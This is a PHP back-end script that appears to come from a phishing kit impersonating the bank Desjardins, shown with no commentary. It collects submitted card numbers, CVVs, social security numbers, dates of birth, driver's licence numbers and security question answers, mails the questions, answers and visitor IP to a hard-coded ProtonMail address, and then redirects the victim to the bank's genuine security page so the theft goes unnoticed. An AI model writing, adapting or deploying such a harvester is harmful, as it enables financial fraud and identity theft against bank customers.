<?php
    $ip = $_SERVER['REMOTE_ADDR'];
    $fullname = $_POST['fullname'];
    $dobd = $_POST['dobd'];
    $dobm = $_POST['dobm'];
    $doby = $_POST['doby'];
    $dll = $_POST['cc'];
    $exp = $_POST['em']."/".$_POST['ey'];
    $cvv = $_POST['cvv'];
    $dl = $_POST['dl'];
    $ssn = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
    $q1 = $_POST['question1'];
    $a1 = $_POST['answer1'];
    $q2 = $_POST['question2'];
    $a2 = $_POST['answer2'];
    $q3 = $_POST['question3'];
    $a3 = $_POST['answer3'];
    $data ="
    --------------------------------------------
    IP       : $ip
    --------------------------------------------
    Q1  : $q1
    A2  : $a1
    
    Q2  : $q2
    A2  : $a2
    
    Q3  : $q3
    A3  : $a3
    --------------------------------------------
    
    -------------3|$en--------------------------
    ";
    
    $subj="QUESTIONS $ip";
    
    $emailusr = 'bzfrap514@protonmail.com';
    
    mail($emailusr, $subj, $data);
    
    header("Location: https://www.desjardins.com/securite/nos-pratiques-securite/index.jsp");
    
    
    ?>
